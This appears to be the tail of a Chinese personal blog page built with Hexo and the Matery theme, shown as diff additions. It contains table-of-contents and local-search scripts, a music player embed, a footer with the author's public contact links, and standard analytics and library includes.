+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">thirteensummer</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/thirteen-xiansheng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:Summer-thirteen@protonmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1406807687" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1406807687" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
